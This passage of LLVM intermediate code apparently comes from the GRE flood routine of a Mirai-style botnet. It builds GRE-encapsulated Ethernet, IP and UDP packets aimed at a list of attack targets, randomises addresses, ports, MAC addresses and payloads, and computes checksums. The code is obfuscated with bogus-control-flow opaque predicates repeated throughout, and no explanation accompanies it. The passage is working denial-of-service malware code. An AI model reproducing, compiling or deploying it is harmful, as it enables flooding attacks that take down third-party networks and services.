  %109 = load i32, i32* %10, align 4
  %110 = call i32 @close(i32 %109)
  br label %648

; <label>:111:                                    ; preds = %103
  %112 = load i32, i32* @x.23
  %113 = load i32, i32* @y.24
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %111
  store i32 0, i32* %9, align 4
  %120 = load i32, i32* @x.23
  %121 = load i32, i32* @y.24
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %128

; <label>:128:                                    ; preds = %332, %originalBBpart24
  %129 = load i32, i32* %9, align 4
  %130 = load i8, i8* %5, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  br i1 %132, label %133, label %335

; <label>:133:                                    ; preds = %128
  %134 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %135 = load i8**, i8*** %11, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  store i8* %134, i8** %138, align 8
  %139 = load i8**, i8*** %11, align 8
  %140 = load i32, i32* %9, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  %143 = load i8*, i8** %142, align 8
  %144 = bitcast i8* %143 to %struct.iphdr*
  store %struct.iphdr* %144, %struct.iphdr** %22, align 8
  %145 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i64 1
  %147 = bitcast %struct.iphdr* %146 to %struct.grehdr*
  store %struct.grehdr* %147, %struct.grehdr** %23, align 8
  %148 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %149 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %148, i64 1
  %150 = bitcast %struct.grehdr* %149 to %struct.ethhdr*
  store %struct.ethhdr* %150, %struct.ethhdr** %24, align 8
  %151 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %152 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %151, i64 1
  %153 = bitcast %struct.ethhdr* %152 to %struct.iphdr*
  store %struct.iphdr* %153, %struct.iphdr** %25, align 8
  %154 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i64 1
  %156 = bitcast %struct.iphdr* %155 to %struct.udphdr*
  store %struct.udphdr* %156, %struct.udphdr** %26, align 8
  %157 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %158 = bitcast %struct.iphdr* %157 to i8*
  %159 = load i8, i8* %158, align 4
  %160 = and i8 %159, 15
  %161 = or i8 %160, 64
  store i8 %161, i8* %158, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %163 = bitcast %struct.iphdr* %162 to i8*
  %164 = load i8, i8* %163, align 4
  %165 = and i8 %164, -16
  %166 = or i8 %165, 5
  store i8 %166, i8* %163, align 4
  %167 = load i8, i8* %12, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i32, i32* %18, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 66, %171
  %173 = trunc i64 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 2
  store i16 %174, i16* %176, align 2
  %177 = load i16, i16* %13, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 3
  store i16 %178, i16* %180, align 4
  %181 = load i8, i8* %14, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 5
  store i8 %181, i8* %183, align 4
  %184 = load i8, i8* %15, align 1
  %185 = icmp ne i8 %184, 0
  br i1 %185, label %186, label %206

; <label>:186:                                    ; preds = %133
  %187 = load i32, i32* @x.23
  %188 = load i32, i32* @y.24
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %186
  %195 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 4
  store i16 %195, i16* %197, align 2
  %198 = load i32, i32* @x.23
  %199 = load i32, i32* @y.24
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %206

; <label>:206:                                    ; preds = %originalBBpart28, %133
  %207 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 6
  store i8 47, i8* %208, align 1
  %209 = load i32, i32* %21, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 8
  store i32 %209, i32* %211, align 4
  %212 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %213 = load i32, i32* %9, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i32 0, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  %220 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %221 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %222 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %221, i32 0, i32 1
  store i16 %220, i16* %222, align 2
  %223 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %224 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %225 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %224, i32 0, i32 2
  store i16 %223, i16* %225, align 1
  %226 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %227 = bitcast %struct.iphdr* %226 to i8*
  %228 = load i8, i8* %227, align 4
  %229 = and i8 %228, 15
  %230 = or i8 %229, 64
  store i8 %230, i8* %227, align 4
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = bitcast %struct.iphdr* %231 to i8*
  %233 = load i8, i8* %232, align 4
  %234 = and i8 %233, -16
  %235 = or i8 %234, 5
  store i8 %235, i8* %232, align 4
  %236 = load i8, i8* %12, align 1
  %237 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 1
  store i8 %236, i8* %238, align 1
  %239 = load i32, i32* %18, align 4
  %240 = sext i32 %239 to i64
  %241 = add i64 28, %240
  %242 = trunc i64 %241 to i16
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 2
  store i16 %243, i16* %245, align 2
  %246 = load i16, i16* %13, align 2
  %247 = zext i16 %246 to i32
  %248 = xor i32 %247, -1
  %249 = trunc i32 %248 to i16
  %250 = call zeroext i16 @htons(i16 zeroext %249) #7
  %251 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 3
  store i16 %250, i16* %252, align 4
  %253 = load i8, i8* %14, align 1
  %254 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 5
  store i8 %253, i8* %255, align 4
  %256 = load i8, i8* %15, align 1
  %257 = icmp ne i8 %256, 0
  br i1 %257, label %258, label %262

; <label>:258:                                    ; preds = %206
  %259 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %260 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 4
  store i16 %259, i16* %261, align 2
  br label %262

; <label>:262:                                    ; preds = %258, %206
  %263 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 6
  store i8 17, i8* %264, align 1
  %265 = call i32 @rand_next()
  %266 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 8
  store i32 %265, i32* %267, align 4
  %268 = load i8, i8* %20, align 1
  %269 = icmp ne i8 %268, 0
  br i1 %269, label %270, label %292

; <label>:270:                                    ; preds = %262
  %271 = load i32, i32* @x.23
  %272 = load i32, i32* @y.24
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %270
  %279 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 9
  %281 = load i32, i32* %280, align 4
  %282 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 9
  store i32 %281, i32* %283, align 4
  %284 = load i32, i32* @x.23
  %285 = load i32, i32* @y.24
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %300

; <label>:292:                                    ; preds = %262
  %293 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 8
  %295 = load i32, i32* %294, align 4
  %296 = sub i32 %295, 1024
  %297 = xor i32 %296, -1
  %298 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 9
  store i32 %297, i32* %299, align 4
  br label %300

; <label>:300:                                    ; preds = %292, %originalBBpart212
  %301 = load i32, i32* @x.23
  %302 = load i32, i32* @y.24
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %300
  %309 = load i16, i16* %16, align 2
  %310 = call zeroext i16 @htons(i16 zeroext %309) #7
  %311 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %312 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %311, i32 0, i32 0
  store i16 %310, i16* %312, align 2
  %313 = load i16, i16* %17, align 2
  %314 = call zeroext i16 @htons(i16 zeroext %313) #7
  %315 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %316 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %315, i32 0, i32 1
  store i16 %314, i16* %316, align 2
  %317 = load i32, i32* %18, align 4
  %318 = sext i32 %317 to i64
  %319 = add i64 8, %318
  %320 = trunc i64 %319 to i16
  %321 = call zeroext i16 @htons(i16 zeroext %320) #7
  %322 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 2
  store i16 %321, i16* %323, align 2
  %324 = load i32, i32* @x.23
  %325 = load i32, i32* @y.24
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBBpart217, label %originalBB14alteredBB

originalBBpart217:                                ; preds = %originalBB14
  br label %332

; <label>:332:                                    ; preds = %originalBBpart217
  %333 = load i32, i32* %9, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %9, align 4
  br label %128

; <label>:335:                                    ; preds = %128
  br label %336

; <label>:336:                                    ; preds = %647, %335
  store i32 0, i32* %9, align 4
  br label %337

; <label>:337:                                    ; preds = %644, %336
  %338 = load i32, i32* %9, align 4
  %339 = load i8, i8* %5, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp slt i32 %338, %340
  br i1 %341, label %342, label %647

; <label>:342:                                    ; preds = %337
  %343 = load i32, i32* @x.23
  %344 = load i32, i32* @y.24
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %342
  %351 = load i8**, i8*** %11, align 8
  %352 = load i32, i32* %9, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds i8*, i8** %351, i64 %353
  %355 = load i8*, i8** %354, align 8
  store i8* %355, i8** %30, align 8
  %356 = load i8*, i8** %30, align 8
  %357 = bitcast i8* %356 to %struct.iphdr*
  store %struct.iphdr* %357, %struct.iphdr** %31, align 8
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i64 1
  %360 = bitcast %struct.iphdr* %359 to %struct.grehdr*
  store %struct.grehdr* %360, %struct.grehdr** %32, align 8
  %361 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %362 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %361, i64 1
  %363 = bitcast %struct.grehdr* %362 to %struct.ethhdr*
  store %struct.ethhdr* %363, %struct.ethhdr** %33, align 8
  %364 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %365 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %364, i64 1
  %366 = bitcast %struct.ethhdr* %365 to %struct.iphdr*
  store %struct.iphdr* %366, %struct.iphdr** %34, align 8
  %367 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i64 1
  %369 = bitcast %struct.iphdr* %368 to %struct.udphdr*
  store %struct.udphdr* %369, %struct.udphdr** %35, align 8
  %370 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i64 1
  %372 = bitcast %struct.udphdr* %371 to i8*
  store i8* %372, i8** %36, align 8
  %373 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i32 0, i32 2
  %378 = load i8, i8* %377, align 4
  %379 = zext i8 %378 to i32
  %380 = icmp slt i32 %379, 32
  %381 = load i32, i32* @x.23
  %382 = load i32, i32* @y.24
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %380, label %389, label %426

; <label>:389:                                    ; preds = %originalBBpart221
  %390 = load i32, i32* @x.23
  %391 = load i32, i32* @y.24
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %389
  %398 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %399 = load i32, i32* %9, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i64 %400
  %402 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i32 0, i32 1
  %403 = load i32, i32* %402, align 4
  %404 = call i32 @ntohl(i32 %403) #7
  %405 = call i32 @rand_next()
  %406 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %407 = load i32, i32* %9, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 2
  %411 = load i8, i8* %410, align 4
  %412 = zext i8 %411 to i32
  %413 = lshr i32 %405, %412
  %414 = add i32 %404, %413
  %415 = call i32 @htonl(i32 %414) #7
  %416 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 9
  store i32 %415, i32* %417, align 4
  %418 = load i32, i32* @x.23
  %419 = load i32, i32* @y.24
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart233, label %originalBB23alteredBB

originalBBpart233:                                ; preds = %originalBB23
  br label %426

; <label>:426:                                    ; preds = %originalBBpart233, %originalBBpart221
  %427 = load i32, i32* %21, align 4
  %428 = icmp eq i32 %427, -1
  br i1 %428, label %429, label %433

; <label>:429:                                    ; preds = %426
  %430 = call i32 @rand_next()
  %431 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %432 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %431, i32 0, i32 8
  store i32 %430, i32* %432, align 4
  br label %433

; <label>:433:                                    ; preds = %429, %426
  %434 = load i16, i16* %13, align 2
  %435 = zext i16 %434 to i32
  %436 = icmp eq i32 %435, 65535
  br i1 %436, label %437, label %468

; <label>:437:                                    ; preds = %433
  %438 = load i32, i32* @x.23
  %439 = load i32, i32* @y.24
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %437
  %446 = call i32 @rand_next()
  %447 = and i32 %446, 65535
  %448 = trunc i32 %447 to i16
  %449 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %450 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %449, i32 0, i32 3
  store i16 %448, i16* %450, align 4
  %451 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 3
  %453 = load i16, i16* %452, align 4
  %454 = zext i16 %453 to i32
  %455 = sub nsw i32 %454, 1000
  %456 = xor i32 %455, -1
  %457 = trunc i32 %456 to i16
  %458 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 3
  store i16 %457, i16* %459, align 4
  %460 = load i32, i32* @x.23
  %461 = load i32, i32* @y.24
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBBpart246, label %originalBB35alteredBB

originalBBpart246:                                ; preds = %originalBB35
  br label %468

; <label>:468:                                    ; preds = %originalBBpart246, %433
  %469 = load i32, i32* @x.23
  %470 = load i32, i32* @y.24
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %468
  %477 = load i16, i16* %16, align 2
  %478 = zext i16 %477 to i32
  %479 = icmp eq i32 %478, 65535
  %480 = load i32, i32* @x.23
  %481 = load i32, i32* @y.24
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %479, label %488, label %510

; <label>:488:                                    ; preds = %originalBBpart250
  %489 = load i32, i32* @x.23
  %490 = load i32, i32* @y.24
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %488
  %497 = call i32 @rand_next()
  %498 = and i32 %497, 65535
  %499 = trunc i32 %498 to i16
  %500 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %501 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %500, i32 0, i32 0
  store i16 %499, i16* %501, align 2
  %502 = load i32, i32* @x.23
  %503 = load i32, i32* @y.24
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBBpart261, label %originalBB52alteredBB

originalBBpart261:                                ; preds = %originalBB52
  br label %510

; <label>:510:                                    ; preds = %originalBBpart261, %originalBBpart250
  %511 = load i16, i16* %17, align 2
  %512 = zext i16 %511 to i32
  %513 = icmp eq i32 %512, 65535
  br i1 %513, label %514, label %520

; <label>:514:                                    ; preds = %510
  %515 = call i32 @rand_next()
  %516 = and i32 %515, 65535
  %517 = trunc i32 %516 to i16
  %518 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %519 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %518, i32 0, i32 1
  store i16 %517, i16* %519, align 2
  br label %520

; <label>:520:                                    ; preds = %514, %510
  %521 = load i8, i8* %20, align 1
  %522 = icmp ne i8 %521, 0
  br i1 %522, label %527, label %523

; <label>:523:                                    ; preds = %520
  %524 = call i32 @rand_next()
  %525 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %526 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %525, i32 0, i32 9
  store i32 %524, i32* %526, align 4
  br label %533

; <label>:527:                                    ; preds = %520
  %528 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 9
  %530 = load i32, i32* %529, align 4
  %531 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %532 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %531, i32 0, i32 9
  store i32 %530, i32* %532, align 4
  br label %533

; <label>:533:                                    ; preds = %527, %523
  %534 = call i32 @rand_next()
  store i32 %534, i32* %37, align 4
  %535 = call i32 @rand_next()
  store i32 %535, i32* %38, align 4
  %536 = call i32 @rand_next()
  store i32 %536, i32* %39, align 4
  %537 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %538 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %537, i32 0, i32 0
  %539 = getelementptr inbounds [6 x i8], [6 x i8]* %538, i32 0, i32 0
  %540 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %539, i8* %540, i32 4)
  %541 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %542 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %541, i32 0, i32 1
  %543 = getelementptr inbounds [6 x i8], [6 x i8]* %542, i32 0, i32 0
  %544 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %543, i8* %544, i32 4)
  %545 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %546 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %545, i32 0, i32 0
  %547 = getelementptr inbounds [6 x i8], [6 x i8]* %546, i32 0, i32 0
  %548 = getelementptr inbounds i8, i8* %547, i64 4
  %549 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %548, i8* %549, i32 2)
  %550 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %551 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %550, i32 0, i32 1
  %552 = getelementptr inbounds [6 x i8], [6 x i8]* %551, i32 0, i32 0
  %553 = getelementptr inbounds i8, i8* %552, i64 4
  %554 = bitcast i32* %39 to i8*
  %555 = getelementptr inbounds i8, i8* %554, i64 2
  call void @util_memcpy(i8* %553, i8* %555, i32 2)
  %556 = load i8, i8* %19, align 1
  %557 = icmp ne i8 %556, 0
  br i1 %557, label %558, label %577

; <label>:558:                                    ; preds = %533
  %559 = load i32, i32* @x.23
  %560 = load i32, i32* @y.24
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %558
  %567 = load i8*, i8** %36, align 8
  %568 = load i32, i32* %18, align 4
  call void @rand_str(i8* %567, i32 %568)
  %569 = load i32, i32* @x.23
  %570 = load i32, i32* @y.24
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %577

; <label>:577:                                    ; preds = %originalBBpart265, %533
  %578 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %579 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %578, i32 0, i32 7
  store i16 0, i16* %579, align 2
  %580 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %581 = bitcast %struct.iphdr* %580 to i16*
  %582 = call zeroext i16 @checksum_generic(i16* %581, i32 20)
  %583 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %584 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %583, i32 0, i32 7
  store i16 %582, i16* %584, align 2
  %585 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 7
  store i16 0, i16* %586, align 2
  %587 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %588 = bitcast %struct.iphdr* %587 to i16*
  %589 = call zeroext i16 @checksum_generic(i16* %588, i32 20)
  %590 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %591 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %590, i32 0, i32 7
  store i16 %589, i16* %591, align 2
  %592 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %593 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %592, i32 0, i32 3
  store i16 0, i16* %593, align 2
  %594 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %595 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %596 = bitcast %struct.udphdr* %595 to i8*
  %597 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %598 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %597, i32 0, i32 2
  %599 = load i16, i16* %598, align 2
  %600 = load i32, i32* %18, align 4
  %601 = sext i32 %600 to i64
  %602 = add i64 8, %601
  %603 = trunc i64 %602 to i32
  %604 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %594, i8* %596, i16 zeroext %599, i32 %603)
  %605 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %606 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %605, i32 0, i32 3
  store i16 %604, i16* %606, align 2
  %607 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %608 = load i32, i32* %9, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %607, i64 %609
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %610, i32 0, i32 0
  %612 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %611, i32 0, i32 0
  store i16 2, i16* %612, align 4
